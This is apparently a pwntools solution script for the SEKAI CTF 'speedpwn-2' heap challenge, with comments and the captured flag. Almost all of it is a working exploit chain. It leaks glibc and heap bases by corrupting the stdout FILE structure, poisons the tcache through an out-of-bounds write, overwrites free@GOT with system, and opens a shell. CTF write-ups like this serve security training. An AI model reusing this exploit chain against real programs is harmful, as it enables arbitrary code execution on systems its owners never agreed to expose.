from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    b *0x40149f
    b *0x4015d5
    b *0x401605
    b *0x40157a
    continue
''')

# p = remote('speedpwn-2.chals.sekai.team', 1337, ssl=True)

# according to the source code of this challenge, the following points that can be exploited are discovered:
# 1. a canva with arg1 lines (size_y) and arg2 columns (size_x) is a chunk allocated by malloc(arg1*arg2)
# 2. a canva with 0x20 lines and 0x20 columns is initially created
# 3. "r [arg1] [arg2]" can create a new canva with arg1 lines and arg2 columns by calling malloc and then remove the old canva by calling free
# 4. once a canva is created, including the initial one, clear_canvas function is called to write arg1*arg2 bytes of "." to this just allocated chunk, but there is a bug at line 19, which is supposed to be "my_canvas.data[i*my_canvas.size_x + j] = '.';"
# 5. print_canvas function is called in every loop to print arg1*arg2 bytes of current chunk data, but there is a bug at line 29, which is supposed to be "putc(my_canvas.data[i*my_canvas.size_x + j], stdout);"
# 6. "p [arg1] [arg2] [arg3]" can execute "my_canvas.data[arg1*my_canvas.size_y + arg2] = arg3;" at line 75 to write a hexadecimal value as a byte to a specific offset (positive or negative) from current chunk address, but it is also a bug and supposed to be "my_canvas.data[arg1*my_canvas.size_x + arg2] = arg3;"
# the three bugs above technically have no practical significance, and the clear_canvas function call after creating any canva obviously makes normal use-after-free leak technique useless

# Stage 1: leak glibc base address and heap base address
# malloc a chunk whose size is greater than 0x20000 bytes to make it go to memory-mapped region (page aligned automatically), which has a fixed offset from glibc base address
p.sendlineafter(b"> ", b'r 1000 1000')  # mmaped_base_addr+0x10 malloced (0xf5000), heap_base_addr+0x2a0 freed (0x1a0)
# attack _IO_2_1_stdout_ in glibc througn integer overflow to use it as read primitive to leak a bunch of data with a customized range
p.sendlineafter(b"> ", f"p 0 {0x2fc5b0+1} {format(0x18, 'x').zfill(2)}".encode())  # ensure value of _IO_2_1_stdout_->_flags is 0xfbad1887
p.sendlineafter(b"> ", f"p 0 {0x2fc5d0+1} {format(0x00, 'x').zfill(2)}".encode())  # ensure last second significant byte of _IO_2_1_stdout_->_IO_write_base is \x00
# a large amount of bytes from *_IO_write_base=(_IO_2_1_stdout_+0x83)&0xffffffffffff00ff to *_IO_write_ptr=_IO_2_1_stdout_+0x83 are leaked out, containing a lot of useful information
leaks = p.recvuntil(b"Current canvas:\n", drop=True)[0:-3]
glibc_base_addr = u64(leaks[-0x40:-0x38])-0x204644
log.info(f"glibc base address: {hex(glibc_base_addr)}")
heap_base_addr = u64(leaks[-0xb20:-0xb18])-0x1440
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: tcache poisoning to elf to arbitrary write to pop a shell
# prepare for tcache poisoning
p.sendlineafter(b"> ", b'r 1 1')  # heap_base_addr+0x1450 malloced (0x20), mmaped_base_addr+0x10 freed (0xf5000)
p.sendlineafter(b"> ", b'r 1 1')  # heap_base_addr+0x1470 malloced (0x20), heap_base_addr+0x1450 freed (0x20)
p.sendlineafter(b"> ", b'r 20 20')  # heap_base_addr+0x2a0 malloced (0x1a0), heap_base_addr+0x1470 freed (0x20)
# overwrite from chunk at heap_base_addr+0x2a0 to chunk at heap_base_addr+0x1470 through integer overflow to make tcache bin of size 0x20 looks like (heap_base_addr+0x1470) -> 0x404050
for i in range(8):
    # write one byte at a time
    byte_val = ((((heap_base_addr+0x1470)>>12)^(0x404050))>>(8*i))&0xff
    hex_val = format(byte_val, "x")
    p.sendlineafter(b"> ", f"p 0 {0x11d0+i} {hex_val}".encode())
# perform tcache poisoning
p.sendlineafter(b"> ", b'r 1 1')  # heap_base_addr+0x1470 malloced (0x20), heap_base_addr+0x2a0 freed (0x1a0)
p.sendlineafter(b"> ", b'r 1 1')  # 0x404050 malloced (0x20), heap_base_addr+0x1470 freed (0x20)
# overwrite 0x404050 through integer overflow to make *0x404050="/bin/sh\x00"
for i in range(8):
    # write one byte at a time
    byte_val = b'/bin/sh\x00'[i]
    hex_val = format(byte_val, "x")
    p.sendlineafter(b"> ", f"p 0 {i} {hex_val}".encode())
glibc_e = ELF('./libc.so.6')
# overwrite from 0x404050 to 0x404000 through integer overflow to make *0x404000=*free@got=glibc_system_addr
for i in range(8):
    # write one byte at a time
    byte_val = ((glibc_base_addr+glibc_e.sym.system)>>(8*i))&0xff
    hex_val = format(byte_val, "x")
    p.sendlineafter(b"> ", f"p 0 -{0x50-i} {hex_val}".encode())
# trigger system("/bin/sh\x00") by free(0x404050)
p.sendlineafter(b"> ", b'r 1 1')  # heap_base_addr+0x1470 malloced (0x20), 0x404050 freed (0x20) -> pop a shell

p.interactive()

# SEKAI{L4st_y34rs_w4s_t0o_h4rd_1_h0p3_th1s_0n3_w4s_m0r3_s1mpl3!}